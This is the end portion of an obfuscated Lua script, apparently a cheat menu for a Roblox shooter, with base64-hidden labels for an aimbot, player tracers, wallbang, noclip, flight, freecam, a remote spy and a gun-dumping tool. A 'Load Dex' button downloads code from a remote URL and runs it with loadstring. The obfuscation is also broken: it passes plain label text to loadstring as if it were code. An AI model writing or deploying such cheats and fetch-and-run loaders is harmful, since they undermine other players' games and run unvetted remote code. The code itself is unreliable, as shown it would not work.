    g.Slider(loadstring(base64decode("U21vb3RoaW5n"))(), 0, 95, function() return aimSmooth end, function(v) aimSmooth = v end, loadstring(base64decode("JQ=="))())
    g.Toggle(loadstring(base64decode("U2hvdyBGT1Y="))(), loadstring(base64decode("YWltY2lyY2xl"))())
    g.Toggle(loadstring(base64decode("UHJlZGljdCBNb3ZlbWVudA=="))(), loadstring(base64decode("YWltb2Zmc2V0"))())
    g.Slider(loadstring(base64decode("UHJlZGljdGlvbg=="))(), 1, 30, function() return aimOffset end, function(v) aimOffset = v end)

    local tracerGroup = aimTab.group(loadstring(base64decode("bGVmdA=="))(), loadstring(base64decode("VHJhY2Vy"))())
    tracerGroup.Toggle(loadstring(base64decode("Q2xvc2VzdCBQbGF5ZXIgVHJhY2Vy"))(), loadstring(base64decode("YWltdHJhY2Vy"))())
    tracerGroup.Cycle(loadstring(base64decode("VHJhY2VyIEZyb20="))(), TRACER_FROMS, function() return tracerFromIndex end, function(JfZaEVmK) tracerFromIndex = JfZaEVmK end)

    local checks = aimTab.group(loadstring(base64decode("cmlnaHQ="))(), loadstring(base64decode("Q2hlY2tz"))())
    checks.Toggle(loadstring(base64decode("V2FsbCBDaGVjaw=="))(), loadstring(base64decode("YWltd2FsbA=="))())
    checks.Toggle(loadstring(base64decode("U0FGRSBDaGVjaw=="))(), loadstring(base64decode("YWltc2FmZQ=="))())
    checks.Toggle(loadstring(base64decode("VGVhbSBDaGVjaw=="))(), loadstring(base64decode("YWltdGVhbQ=="))())
    checks.Toggle(loadstring(base64decode("R3VuIE9ubHk="))(), loadstring(base64decode("YWltZ3Vu"))())

    local never = aimTab.group(loadstring(base64decode("cmlnaHQ="))(), loadstring(base64decode("TmV2ZXIgQWltIEF0"))())
    local neverList
    local neverRows = {}
    local function refreshNeverUI()
        for _, row in ipairs(neverRows) do row:Destroy() end
        neverRows = {}
        local names = {}
        for name in pairs(aimBlacklist) do table.insert(names, name) end
        table.sort(names)
        for _, name in ipairs(names) do
            local row = make(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), {
                Size = UDim2.new(1, 0, 0, 16), BackgroundTransparency = 1, AutoButtonColor = false, Text = loadstring(base64decode("Wy1dIA=="))() .. name,
                Font = UI_FONT, TextSize = 14, TextColor3 = Color3.fromRGB(255, 200, 90), TextXAlignment = Enum.TextXAlignment.Left,
            }, neverList)
            row.MouseButton1Click:Connect(function()
                aimBlacklist[name] = nil
                saveAimBlacklist()
                refreshNeverUI()
            end)
            neverRows[#neverRows + 1] = row
        end
    end
    never.Label(loadstring(base64decode("TGlzdGVkIHBsYXllcnMgYXJlIHNraXBwZWQgYnkgdGhlIGFpbWJvdCBhbmQgdHJhY2VyLiBDbGljayBhIHJvdyB0byByZW1vdmUgaXQu"))())
    never.Input(loadstring(base64decode("dXNlcm5hbWUgKyBFbnRlcg=="))(), function(text)
        addAimBlacklist(text)
        cancelLock()
        refreshNeverUI()
    end)
    neverList = never.Container()
    refreshNeverUI()

    local status = aimTab.group(loadstring(base64decode("cmlnaHQ="))(), loadstring(base64decode("U3RhdHVz"))())
    aimDebugLabel = status.Label(loadstring(base64decode(""))())
end

local loadoutTab = addTab(loadstring(base64decode("TG9hZG91dA=="))())
do
    local g = loadoutTab.group(loadstring(base64decode("bGVmdA=="))(), loadstring(base64decode("TG9hZG91dA=="))())
    g.Label(loadstring(base64decode("T25lIGNoYXQgY29tbWFuZCBwZXIgbGluZSwgc2VudCBpbiBvcmRlci4="))())
    g.TextArea(loadstring(base64decode("IXNwYXduIC4uLlxuIXNwYXduYXJtb3IgLi4uXG4hc3Bhd25tYWdzIC4uLg=="))(), loadout.text,
        function(text) loadout.text = text end,
        function() loadout.save() end)
    g.Button(loadstring(base64decode("UnVuIExvYWRvdXQ="))(), function() loadout.run() end)
    g.Button(loadstring(base64decode("U3RvcA=="))(), function()
        loadout.stop()
        notify(loadstring(base64decode("TG9hZG91dCBzdG9wcGVk"))())
    end)
    g.Toggle(loadstring(base64decode("UnVuIE9uIFJlc3Bhd24="))(), loadstring(base64decode("bG9hZG91dHNwYXdu"))())
    g.Slider(loadstring(base64decode("RGVsYXkgQmV0d2VlbiBDb21tYW5kcw=="))(), 250, 10000, function() return loadout.delayMs end,
        function(v) loadout.delayMs = v end, loadstring(base64decode("bXM="))())

    local info = loadoutTab.group(loadstring(base64decode("cmlnaHQ="))(), loadstring(base64decode("Q29tbWFuZHMgSW4gVGhpcyBQbGFjZQ=="))())
    info.Label(loadstring(base64decode("RnJvbSB0aGUgZ2FtZSdzIGNoYXQgY29tbWFuZHMgKGFsaWFzIGluIGJyYWNrZXRzKTpcbg=="))()
        .. loadstring(base64decode("IXNwYXduIFshc11cbiFzcGF3bmFybW9yIFshc2FdXG4hc3Bhd25tYWdzIFshc21dXG4hc3Bhd250b29scyBbIXN0XVxu"))()
        .. loadstring(base64decode("IXNldGFybW9yIFshc3RhXVxuIXJlZmlsbCBbIXJmXVxuIWhlYWwgWyFoXVxuIW1zcGF3biBbIW1zXVxuIWRzcGF3biBbIWRzXVxu"))()
        .. loadstring(base64decode("VHlwZSAhY21kcyBpbiBnYW1lIGZvciB0aGUgZnVsbCBsaXN0IGFuZCB3aGF0IGVhY2ggb25lIHRha2VzLiA="))()
        .. loadstring(base64decode("UHV0IHRoZSBleGFjdCB0ZXh0IHlvdSdkIG5vcm1hbGx5IHR5cGUgb24gZWFjaCBsaW5lLg=="))())
end

local wallTab = addTab(loadstring(base64decode("V2FsbGJhbmc="))())
do
    local g = wallTab.group(loadstring(base64decode("bGVmdA=="))(), loadstring(base64decode("V2FsbGJhbmc="))())
    g.Toggle(loadstring(base64decode("RW5hYmxlZA=="))(), loadstring(base64decode("d2FsbGJhbmc="))())
    g.Cycle(loadstring(base64decode("TWV0aG9k"))(), WALL_METHODS, function() return wallMethodIndex end, function(JfZaEVmK) wallMethodIndex = JfZaEVmK end)
    wallDebugLabel = g.Label(loadstring(base64decode(""))())
end

local worldTab = addTab(loadstring(base64decode("V29ybGQ="))())
do
    local light = worldTab.group(loadstring(base64decode("bGVmdA=="))(), loadstring(base64decode("TGlnaHRpbmc="))())
    light.Toggle(loadstring(base64decode("QWx3YXlzIERheQ=="))(), loadstring(base64decode("ZGF5"))(), function(on)
        if on then
            savedClock = Lighting.ClockTime
        elseif savedClock then
            Lighting.ClockTime = savedClock
            savedClock = nil
        end
    end)
    light.Toggle(loadstring(base64decode("Tm8gRGFyaw=="))(), loadstring(base64decode("bm9kYXJr"))(), function(on)
        if on then
            noDarkSaved = {
                ambient = Lighting.Ambient,
                outdoor = Lighting.OutdoorAmbient,
                exposure = Lighting.ExposureCompensation,
            }
            applyNoDark()
        else
            restoreNoDark()
        end
    end)
    light.Toggle(loadstring(base64decode("Tm8gRm9n"))(), loadstring(base64decode("bm9mb2c="))(), function(on)
        if on then
            noFogSaved = { fogStart = Lighting.FogStart, fogEnd = Lighting.FogEnd }
            atmosphereSaved = {}
            for atmosphere in pairs(atmospheres) do saveAtmosphere(atmosphere) end
            applyNoFog()
        else
            restoreNoFog()
        end
    end)
    local levelNames = {}
    for JfZaEVmK, level in ipairs(NODARK_LEVELS) do levelNames[JfZaEVmK] = level.name end
    light.Cycle(loadstring(base64decode("Tm8gRGFyayBMZXZlbA=="))(), levelNames, function() return noDarkLevel end, function(JfZaEVmK)
        noDarkLevel = JfZaEVmK
        applyNoDark()
    end)

    local feed = worldTab.group(loadstring(base64decode("bGVmdA=="))(), loadstring(base64decode("S2lsbCBGZWVk"))())
    feed.Toggle(loadstring(base64decode("S2lsbCBGZWVk"))(), loadstring(base64decode("a2lsbGxvZw=="))(), function(on)
        if not on then killLog.clear() end
    end)

    local cam = worldTab.group(loadstring(base64decode("bGVmdA=="))(), loadstring(base64decode("Q2FtZXJh"))())
    refreshFreecam = cam.Toggle(loadstring(base64decode("RnJlZWNhbQ=="))(), loadstring(base64decode("ZnJlZWNhbQ=="))(), function(on) setFreecam(on) end)

    local walls = worldTab.group(loadstring(base64decode("cmlnaHQ="))(), loadstring(base64decode("V2FsbHM="))())
    walls.Toggle(loadstring(base64decode("V2FsbCBDbGljaw=="))(), loadstring(base64decode("d2FsbGNsaWNr"))(), function(on)
        if on and type(fireclickdetector) ~= loadstring(base64decode("ZnVuY3Rpb24="))() then
            options.wallclick = false
            notify(loadstring(base64decode("ZmlyZWNsaWNrZGV0ZWN0b3IgaXMgbWlzc2luZw=="))())
        end
    end)
    walls.Toggle(loadstring(base64decode("V2FsbCBOb2NsaXA="))(), loadstring(base64decode("bm9jbGlw"))())
    walls.Button(loadstring(base64decode("UmVzZXQgV2FsbHM="))(), resetNoclip)
end

local miscTab = addTab(loadstring(base64decode("TWlzYw=="))())
do
    local tools = miscTab.group(loadstring(base64decode("bGVmdA=="))(), loadstring(base64decode("VG9vbHM="))())
    tools.Toggle(loadstring(base64decode("UmVtb3RlIFNweQ=="))(), loadstring(base64decode("c3B5"))())
    local spyLabel = tools.Label(loadstring(base64decode("TG9nZ2VkOiAw"))())
    spyRefresh = function() spyLabel.Text = loadstring(base64decode("TG9nZ2VkOiA="))() .. spyCount end
    tools.Button(loadstring(base64decode("RHVtcCBHdW4="))(), function()
        local ok, info = dumpGun()
        notify(ok and (loadstring(base64decode("RHVtcGVkIA=="))() .. info) or info)
    end)

    local dexLoaded, dexBusy = false, false
    tools.Button(loadstring(base64decode("TG9hZCBEZXg="))(), function()
        if dexLoaded or dexBusy then return end
        if type(loadstring) ~= loadstring(base64decode("ZnVuY3Rpb24="))() then notify(loadstring(base64decode("bG9hZHN0cmluZyBpcyBtaXNzaW5n"))()) return end
        dexBusy = true
        notify(loadstring(base64decode("TG9hZGluZyBEZXguLi4="))())
        task.spawn(function()
            local ok, err = pcall(function()
                loadstring(game:HttpGet(DEX_URL))()
            end)
            dexBusy = false
            if ok then
                dexLoaded = true
                notify(loadstring(base64decode("RGV4IGxvYWRlZA=="))())
            else
                warn(loadstring(base64decode("W2xhcnB3YXJlXSBEZXggZmFpbGVkIHRvIGxvYWQ6IA=="))() .. tostring(err))
                notify(loadstring(base64decode("RGV4IGZhaWxlZCB0byBsb2Fk"))())
            end
        end)
    end)

    local flight = miscTab.group(loadstring(base64decode("bGVmdA=="))(), loadstring(base64decode("RmxpZ2h0"))())
    refreshFly = flight.Toggle(loadstring(base64decode("RmxpZ2h0"))(), loadstring(base64decode("Zmx5"))(), setFly)
    flight.Keybind(loadstring(base64decode("VG9nZ2xlIEtleQ=="))(), function() return fly.key end, function(key) fly.key = key end)
    flight.Slider(loadstring(base64decode("U3BlZWQ="))(), 10, 250, function() return fly.speed end, function(v) fly.speed = v end)
    flight.Label(loadstring(base64decode("V0FTRCBtb3ZlcyBhbG9uZyB0aGUgY2FtZXJhLCBTcGFjZSB1cCwgTGVmdEN0cmwgZG93bi4="))())

    local exec = miscTab.group(loadstring(base64decode("cmlnaHQ="))(), loadstring(base64decode("RXhlY3V0b3I="))())
    local capLabel = exec.Label(loadstring(base64decode(""))())
    exec.Button(loadstring(base64decode("Q2hlY2sgRXhlY3V0b3I="))(), function() capLabel.Text = capabilityText() end)

    local menuGroup = miscTab.group(loadstring(base64decode("cmlnaHQ="))(), loadstring(base64decode("TWVudQ=="))())
    menuGroup.Button(loadstring(base64decode("VW5sb2Fk"))(), cleanup)
end

selectTab(tabs[1])

local dragging, dragStart, startPos
titleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging, dragStart, startPos = true, input.Position, window.Position
    end
end)
table.insert(connections, UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        window.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end))
table.insert(connections, UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end))

table.insert(connections, UserInputService.InputBegan:Connect(function(input, processed)
    if processed then return end
    if input.KeyCode == MENU_KEY then window.Visible = not window.Visible end
end))
end
k7wscasF(45luG)
end)(...)
